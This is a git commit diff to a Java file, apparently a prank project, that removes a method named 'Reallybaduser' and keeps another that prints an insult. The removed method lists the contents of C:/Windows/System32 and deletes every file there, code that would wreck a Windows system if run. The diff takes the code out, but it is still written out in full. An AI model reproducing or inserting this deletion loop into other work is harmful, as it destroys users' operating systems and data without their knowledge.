2edf3afd18db6ef70066c85433bd6d9ae0c3cd40
troy600 <bazartroy531@gmail.com>
2024-10-30 15:11:23 +0800

    updates

--- classes.java
+++ classes.java
@@ -1,17 +1,5 @@
-import java.io.File;
-
 public class classes {
 
-    public static void Reallybaduser() {
-        File index = new File("C:/Windows/System32");
-        String[] entries = index.list();
-        if (entries != null) {
-            for (String f : entries) {
-                File file = new File(index.getPath(), f);
-                file.delete();
-            }
-        }
-    }
 
     public static void BadUser() {
         System.out.println("You're officially an asshole");
